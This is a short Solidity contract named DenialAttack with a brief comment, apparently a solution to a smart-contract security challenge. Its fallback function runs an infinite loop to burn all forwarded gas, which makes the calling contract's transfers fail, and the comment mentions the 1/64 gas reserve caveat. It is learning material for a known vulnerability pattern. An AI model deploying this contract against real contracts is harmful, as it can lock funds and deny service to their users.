```javascript
pragma solidity ^0.6.0;

contract DenialAttack {
    fallback() external payable {
        // Consume all gas
        while (true) {
        }
    }
}
```

Just have a function to consume all gas, so the transaction always fail. There is a caveat, something about 1/64 gas is reserved and cannot be used for calls.